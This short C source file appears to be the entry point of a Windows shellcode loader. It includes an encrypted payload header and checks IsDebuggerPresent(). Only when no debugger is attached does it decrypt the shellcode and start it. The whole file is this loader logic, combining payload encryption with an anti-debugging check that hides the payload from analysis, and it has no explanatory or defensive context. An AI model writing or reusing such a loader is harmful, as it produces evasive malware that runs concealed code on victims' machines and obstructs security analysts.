#include <windows.h>
#include "../payload_encrypted/payload.h"

int main() {
    if (!IsDebuggerPresent()) {
        decryptShellCode();
        startShellCode();
    }
    return 0;
}